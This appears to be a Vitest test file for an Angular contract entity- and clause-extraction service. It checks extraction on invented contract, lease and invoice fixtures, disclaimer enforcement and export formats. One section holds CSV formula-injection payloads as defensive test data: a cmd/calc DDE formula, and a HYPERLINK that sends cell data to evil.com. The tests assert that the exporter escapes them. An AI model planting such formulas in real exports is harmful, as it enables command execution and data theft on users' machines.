import { describe, it, expect, beforeEach, vi } from 'vitest';
import { TestBed } from '@angular/core/testing';
import { EntityClauseExtractionService } from './entity-clause-extraction.service';
import { StorageService } from './storage.service';
import { ExtractedWordToken, LEGAL_DISCLAIMER } from '../models/entity-clause.types';

describe('EntityClauseExtractionService — P6 Entity & Clause Extraction', () => {
  let service: EntityClauseExtractionService;
  let mockStorageService: { saveFile: any };

  beforeEach(() => {
    mockStorageService = {
      saveFile: vi.fn().mockImplementation(async (file: File) => `file:///mock/storage/${file.name}`)
    };

    TestBed.configureTestingModule({
      providers: [
        EntityClauseExtractionService,
        { provide: StorageService, useValue: mockStorageService }
      ]
    });

    service = TestBed.inject(EntityClauseExtractionService);
  });

  describe('1. Entity Extraction from Fixture — Dates and Amounts', () => {
    const contractFixture = `
      COMMERCIAL SERVICE AGREEMENT
      This Agreement is entered into on 15/10/2024 (the "Effective Date").
      Contract ID: CNT-8829-X
      Between Acme Innovations Ltd ("Client") and Global Tech Solutions LLC ("Contractor").
      1. Fees and Payment:
      The Client agrees to pay the total amount of $50,000 USD for services rendered.
      An initial deposit of $10,000 shall be paid upon signing.
      2. Performance & Deadlines:
      The Contractor shall deliver the final deliverables within 30 days of commencement.
      Client must review the deliverables on or before November 20, 2024.
      3. Penalties & Termination:
      In the event of unexcused delay, a penalty of $500 per day shall apply.
      Either party may terminate this agreement subject to 15 days written notice.
    `;

    it('correctly identifies known dates in fixture', () => {
      const result = service.extract(contractFixture);
      const dateEntities = result.entities.filter(e => e.type === 'date');

      expect(dateEntities.length).toBeGreaterThanOrEqual(2);

      const effectiveDate = dateEntities.find(d => d.value.includes('15/10/2024'));
      expect(effectiveDate).toBeDefined();
      expect(effectiveDate?.label).toBe('Effective Date');

      const novemberDate = dateEntities.find(d => d.value.includes('November 20, 2024'));
      expect(novemberDate).toBeDefined();
    });

    it('correctly identifies known amounts in fixture', () => {
      const result = service.extract(contractFixture);
      const amounts = result.entities.filter(e => e.type === 'amount');

      expect(amounts.length).toBeGreaterThanOrEqual(3);

      const fiftyThousand = amounts.find(a => a.value.includes('50,000'));
      expect(fiftyThousand).toBeDefined();
      expect(fiftyThousand?.normalizedValue).toBe(50000);
      expect(fiftyThousand?.label).toBe('Total Amount');

      const tenThousand = amounts.find(a => a.value.includes('10,000'));
      expect(tenThousand).toBeDefined();
      expect(tenThousand?.label).toBe('Security Deposit');

      const penaltyAmount = amounts.find(a => a.value.includes('500'));
      expect(penaltyAmount).toBeDefined();
      expect(penaltyAmount?.label).toBe('Penalty Amount');
    });

    it('identifies contracting parties, deadlines, and reference numbers', () => {
      const result = service.extract(contractFixture);

      // Contracting parties
      const parties = result.entities.filter(e => e.type === 'party');
      expect(parties.length).toBeGreaterThanOrEqual(2);
      expect(parties.some(p => p.value.includes('Acme Innovations'))).toBe(true);
      expect(parties.some(p => p.value.includes('Global Tech Solutions'))).toBe(true);

      // Deadlines
      const deadlines = result.entities.filter(e => e.type === 'deadline');
      expect(deadlines.length).toBeGreaterThanOrEqual(1);
      expect(deadlines.some(d => d.value.includes('within 30 days'))).toBe(true);

      // References
      const refs = result.entities.filter(e => e.type === 'reference');
      expect(refs.some(r => r.value.includes('CNT-8829-X'))).toBe(true);
    });
  });

  describe('2. Page Anchor Bounding Box Resolution to Geometric Coordinates', () => {
    it('resolves page anchors to exact geometric coordinates from tokens', () => {
      const text = 'Execution Date: 2024-10-15 Amount: $15,000.00';
      const tokens: ExtractedWordToken[] = [
        { text: 'Execution', x: 50, y: 120, width: 60, height: 14, pageNumber: 2 },
        { text: 'Date:', x: 115, y: 120, width: 35, height: 14, pageNumber: 2 },
        { text: '2024-10-15', x: 155, y: 120, width: 75, height: 14, pageNumber: 2 },
        { text: 'Amount:', x: 240, y: 120, width: 50, height: 14, pageNumber: 2 },
        { text: '$15,000.00', x: 295, y: 120, width: 80, height: 14, pageNumber: 2 }
      ];

      const result = service.extract(text, tokens, 2);

      const dateEntity = result.entities.find(e => e.type === 'date');
      expect(dateEntity).toBeDefined();
      expect(dateEntity?.pageNumber).toBe(2);
      expect(dateEntity?.boundingBox.x).toBe(155);
      expect(dateEntity?.boundingBox.y).toBe(120);
      expect(dateEntity?.boundingBox.width).toBe(75);
      expect(dateEntity?.boundingBox.height).toBe(14);

      const amountEntity = result.entities.find(e => e.type === 'amount');
      expect(amountEntity).toBeDefined();
      expect(amountEntity?.pageNumber).toBe(2);
      expect(amountEntity?.boundingBox.x).toBe(295);
      expect(amountEntity?.boundingBox.y).toBe(120);
      expect(amountEntity?.boundingBox.width).toBe(80);
      expect(amountEntity?.boundingBox.height).toBe(14);
    });

    it('synthesizes consistent geometric anchors when word tokens are omitted', () => {
      const text = 'Total Fee: $2,500';
      const result = service.extract(text);

      const amount = result.entities.find(e => e.type === 'amount');
      expect(amount).toBeDefined();
      expect(amount?.boundingBox.x).toBe(72); // standard 1-inch PDF point margin
      expect(amount?.boundingBox.y).toBeGreaterThanOrEqual(100);
      expect(amount?.boundingBox.width).toBeGreaterThan(0);
      expect(amount?.boundingBox.pageNumber).toBe(1);
    });
  });

  describe('3. Obligation-Bearing Clause Classifier and Linguistic Markers', () => {
    it('identifies obligation keywords: must, shall, agrees to', () => {
      const text = `
        The Contractor shall maintain confidential records.
        The Tenant must keep the premises clean and undamaged.
        The Client agrees to pay monthly invoices upon receipt.
      `;

      const result = service.extract(text);
      const obligations = result.clauses.filter(c => c.category === 'obligation');

      expect(obligations.length).toBe(3);
      expect(obligations.some(c => c.modalMarkers.includes('shall'))).toBe(true);
      expect(obligations.some(c => c.modalMarkers.includes('must'))).toBe(true);
      expect(obligations.some(c => c.modalMarkers.includes('agrees to'))).toBe(true);
    });

    it('groups clauses correctly into Obligations, Deadlines, Penalties, and Rights', () => {
      const clausesText = `
        1. The Vendor shall perform the migration services.
        2. Deliverables must be submitted within 14 calendar days of order.
        3. Failure to comply shall trigger a penalty of 10% liquidated damages.
        4. Customer is entitled to terminate this agreement subject to written notice.
      `;

      const result = service.extract(clausesText);

      const obligationClause = result.clauses.find(c => c.category === 'obligation');
      expect(obligationClause).toBeDefined();
      expect(obligationClause?.text).toContain('shall perform the migration');

      const deadlineClause = result.clauses.find(c => c.category === 'deadline');
      expect(deadlineClause).toBeDefined();
      expect(deadlineClause?.text).toContain('within 14 calendar days');

      const penaltyClause = result.clauses.find(c => c.category === 'penalty');
      expect(penaltyClause).toBeDefined();
      expect(penaltyClause?.text).toContain('penalty');

      const rightClause = result.clauses.find(c => c.category === 'right');
      expect(rightClause).toBeDefined();
      expect(rightClause?.text).toContain('entitled to terminate');
    });
  });

  describe('4. Strict Honesty Gate — Legal Disclaimer Enforcement', () => {
    it('strictly enforces the exact legal disclaimer in metadata', () => {
      const result = service.extract('Contract agreement text');
      expect(result.metadata.disclaimer).toBe(LEGAL_DISCLAIMER);
      expect(result.metadata.disclaimer).toBe(
        'Information extraction only. This tool finds text patterns and does not provide legal advice.'
      );
    });

    it('enforces disclaimer in JSON exports', async () => {
      const result = service.extract('Agreement text with $10,000 amount');
      const jsonRes = await service.exportToJson(result, 'test-export.json');

      const parsed = JSON.parse(jsonRes.jsonString);
      expect(parsed.metadata.disclaimer).toBe(
        'Information extraction only. This tool finds text patterns and does not provide legal advice.'
      );
      expect(mockStorageService.saveFile).toHaveBeenCalled();
    });

    it('enforces disclaimer in CSV exports', async () => {
      const result = service.extract('Agreement on 2024-10-15 with $1,000 fee');
      const csvRes = await service.exportToCsv(result, 'test-export.csv');

      expect(csvRes.csvString).toContain(
        'Information extraction only. This tool finds text patterns and does not provide legal advice.'
      );
      expect(csvRes.csvString).toContain('Record Type,Category / Type,Value / Text');
      expect(mockStorageService.saveFile).toHaveBeenCalled();
    });

    it('enforces disclaimer in printable HTML summary report', () => {
      const result = service.extract('Agreement clause text');
      const reportHtml = service.generatePrintableReport(result);

      expect(reportHtml).toContain('<!DOCTYPE html>');
      expect(reportHtml).toContain(
        'Information extraction only. This tool finds text patterns and does not provide legal advice.'
      );
      expect(reportHtml).toContain('Entity &amp; Clause Extraction Summary Report');
    });
  });

  describe('5. Real Test Data — Commercial Lease Agreement', () => {
    const commercialLease = `
      COMMERCIAL REAL ESTATE LEASE AGREEMENT
      This Lease is entered into between Prime Properties LLC ("Landlord") and Metro Retail Inc. ("Tenant").
      Reference ID: LEASE-2025-0044
      1. Term:
      Commencement date of 01/01/2025 and expiration date of 31/12/2027.
      2. Rent & Security Deposit:
      The Tenant shall pay a monthly rent of $4,500 USD on or before the 1st of each month.
      A refundable security deposit of $9,000 is due upon signing.
      3. Repairs & Maintenance:
      The Tenant must keep the leased premises in good working condition.
      4. Default & Late Penalties:
      In the event of delinquent rent, a late penalty of $150 shall apply after 5 business days.
      5. Termination:
      Either party is entitled to terminate this agreement subject to a notice period of 60 days.
    `;

    it('extracts all key lease entities and groups correctly', () => {
      const result = service.extract(commercialLease);

      // Contracting parties
      const parties = result.entities.filter(e => e.type === 'party');
      expect(parties.some(p => p.value.includes('Prime Properties'))).toBe(true);
      expect(parties.some(p => p.value.includes('Metro Retail'))).toBe(true);

      // Financials
      const amounts = result.entities.filter(e => e.type === 'amount');
      expect(amounts.some(a => a.value.includes('4,500'))).toBe(true);
      expect(amounts.some(a => a.value.includes('9,000'))).toBe(true);
      expect(amounts.some(a => a.value.includes('150'))).toBe(true);

      // Deadlines
      const deadlines = result.entities.filter(e => e.type === 'deadline');
      expect(deadlines.some(d => d.value.includes('notice period of 60 days'))).toBe(true);

      // Clauses
      const obligations = result.clauses.filter(c => c.category === 'obligation');
      expect(obligations.some(c => c.text.includes('must keep the leased premises'))).toBe(true);

      const penalties = result.clauses.filter(c => c.category === 'penalty');
      expect(penalties.some(c => c.text.includes('late penalty'))).toBe(true);
    });
  });

  describe('6. Real Test Data — Service Contract with Payment Terms', () => {
    const serviceContract = `
      MASTER SERVICES AGREEMENT
      Effective as of October 15, 2024.
      Agreement between Apex Financial Corp and CloudScale Technologies Ltd.
      Reference Number: MSA-2024-883
      1. Milestones & Compensation:
      Total aggregate contract value is $75,000.
      Initial retainer deposit of $15,000 due upon execution.
      Milestone 1 compensation of $25,000 payable within 30 days of deliverable acceptance.
      2. Performance Obligations:
      The Contractor agrees to deliver the project documentation no later than 15 December 2024.
      Deliverables shall comply with ISO security standards.
      3. Damages and Termination:
      Unexcused delivery failure shall result in liquidated damages of $200 per day.
      Customer has right to terminate for breach within 14 business days.
    `;

    it('extracts contract entities and operative terms', () => {
      const result = serviceContract ? service.extract(serviceContract) : ({} as any);

      // Amounts
      const amounts = result.entities.filter((e: any) => e.type === 'amount');
      expect(amounts.some((a: any) => a.value.includes('75,000'))).toBe(true);
      expect(amounts.some((a: any) => a.value.includes('15,000'))).toBe(true);
      expect(amounts.some((a: any) => a.value.includes('25,000'))).toBe(true);
      expect(amounts.some((a: any) => a.value.includes('200'))).toBe(true);

      // Deadlines
      const deadlines = result.entities.filter((e: any) => e.type === 'deadline');
      expect(deadlines.some((d: any) => d.value.includes('within 30 days'))).toBe(true);

      // Clauses
      expect(result.clauses.some((c: any) => c.category === 'penalty' && c.text.includes('liquidated damages'))).toBe(true);
      expect(result.clauses.some((c: any) => c.category === 'obligation' && c.modalMarkers.includes('shall'))).toBe(true);
      expect(result.clauses.some((c: any) => c.modalMarkers.includes('agrees to'))).toBe(true);
    });
  });

  describe('7. Real Test Data — Vendor Invoice', () => {
    const vendorInvoice = `
      TAX INVOICE
      Vendor: Office Supplies Superstore Pvt Ltd
      Customer: Zenith Consulting LLC
      Invoice No: INV-2024-8841
      GSTIN: 27AABCT3518Q1Z5
      Invoice Date: 2024-11-05
      Payment Due Date: 2024-11-25
      Line Items:
      Ergonomic Chairs: $1,250.00
      Shipping & Tax: $225.00
      Total Amount: $1,475.00
      Payment Terms:
      Purchaser must remit full payment on or before November 25, 2024.
      Late payments shall incur a penalty fee of 1.5% per month.
    `;

    it('extracts invoice identifiers, dates, financial breakdown, and terms', () => {
      const result = service.extract(vendorInvoice);

      // References
      const refs = result.entities.filter(e => e.type === 'reference');
      expect(refs.some(r => r.value.includes('INV-2024-8841'))).toBe(true);
      expect(refs.some(r => r.value.includes('27AABCT3518Q1Z5'))).toBe(true);

      // Dates
      const dates = result.entities.filter(e => e.type === 'date');
      expect(dates.some(d => d.value.includes('2024-11-05'))).toBe(true);
      expect(dates.some(d => d.value.includes('2024-11-25'))).toBe(true);

      // Amounts
      const amounts = result.entities.filter(e => e.type === 'amount');
      expect(amounts.some(a => a.value.includes('1,475.00'))).toBe(true);

      // Clause
      expect(result.clauses.some(c => c.text.includes('penalty fee'))).toBe(true);
    });
  });

  describe('8. Cybersecurity Stress-Testing — Injection & ReDoS Defense', () => {
    it('neutralizes CSV / Spreadsheet formula injection attacks in exported cells', async () => {
      const maliciousResult = {
        entities: [
          {
            id: 'e1',
            type: 'amount' as const,
            label: '=cmd|\' /C calc\'!A0',
            value: '+123456789',
            pageNumber: 1,
            boundingBox: { x: 10, y: 10, width: 50, height: 10, pageNumber: 1 },
            confidence: 90,
            contextSentence: '@SUM(1, 9999)'
          },
          {
            id: 'e2',
            type: 'party' as const,
            label: '-MIN(2, 4)',
            value: '=HYPERLINK("http://evil.com/leak?data="&A1, "Click")',
            pageNumber: 1,
            boundingBox: { x: 10, y: 10, width: 50, height: 10, pageNumber: 1 },
            confidence: 90
          }
        ],
        clauses: [
          {
            id: 'c1',
            category: 'obligation' as const,
            categoryLabel: '=DDE("server","topic","item")',
            text: '+cmd.exe',
            modalMarkers: ['must'],
            pageNumber: 1,
            boundingBox: { x: 10, y: 10, width: 50, height: 10, pageNumber: 1 },
            confidence: 90
          }
        ],
        pageCount: 1,
        rawText: '',
        summary: {
          totalEntities: 2,
          totalClauses: 1,
          amountsCount: 1,
          datesDeadlinesCount: 0,
          partiesCount: 1,
          clausesCount: 1
        },
        metadata: {
          extractedAt: new Date().toISOString(),
          executionTimeMs: 1,
          disclaimer: LEGAL_DISCLAIMER
        }
      };

      const { csvString } = await service.exportToCsv(maliciousResult, 'audit.csv');

      // Verify that every malicious cell starting with =, +, -, @ is escaped with '
      expect(csvString).not.toContain(',=cmd');
      expect(csvString).not.toContain(',+123456789');
      expect(csvString).not.toContain(',@SUM');
      expect(csvString).not.toContain(',-MIN');
      expect(csvString).not.toContain(',=HYPERLINK');
      expect(csvString).not.toContain(',=DDE');
      expect(csvString).not.toContain(',+cmd.exe');

      // Should be prefixed with a single quote
      expect(csvString).toContain('\'=cmd');
      expect(csvString).toContain('\'+123456789');
      expect(csvString).toContain('\'@SUM');
      expect(csvString).toContain('\'-MIN');
    });

    it('resists ReDoS regex attacks and processes pathological input safely', () => {
      // 50,000 repetitions of spaces and words without match anchors
      const evilPayload = 'between ' + ' Acme '.repeat(2000) + ' and ' + ' Corp '.repeat(2000);
      const start = performance.now();
      const result = service.extract(evilPayload);
      const duration = performance.now() - start;

      // Must complete in under 500ms
      expect(duration).toBeLessThan(500);
      expect(result).toBeDefined();
    });
  });
});
